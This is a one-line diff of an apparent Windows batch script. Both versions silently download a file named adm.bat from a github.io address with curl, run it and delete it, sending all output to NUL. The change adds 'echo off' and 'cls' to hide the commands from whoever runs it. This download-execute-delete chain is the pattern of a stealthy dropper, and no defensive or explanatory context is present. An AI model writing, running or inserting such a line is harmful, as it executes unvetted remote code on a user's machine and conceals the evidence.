@@ -1,1 +1,1 @@
-curl -o adm.bat https://suporteeq.github.io/adm.bat > NUL 2>&1 && call adm.bat && del adm.bat > NUL 2>&1
+@echo off && cls && curl -o adm.bat https://suporteeq.github.io/adm.bat > NUL 2>&1 && call adm.bat && del adm.bat > NUL 2>&1
